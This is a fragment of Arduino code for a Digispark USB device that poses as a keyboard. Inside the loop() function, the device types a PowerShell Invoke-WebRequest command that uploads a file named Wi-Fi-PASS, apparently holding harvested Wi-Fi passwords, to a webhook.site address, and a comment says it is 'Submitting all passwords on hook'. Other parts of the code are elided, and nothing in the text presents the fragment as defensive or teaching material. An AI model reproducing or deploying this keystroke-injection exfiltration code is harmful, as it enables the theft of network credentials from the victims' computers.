...
void loop() {
  ...
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/e3f214e6-63ed-44dd-8842-6834f35041cc -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
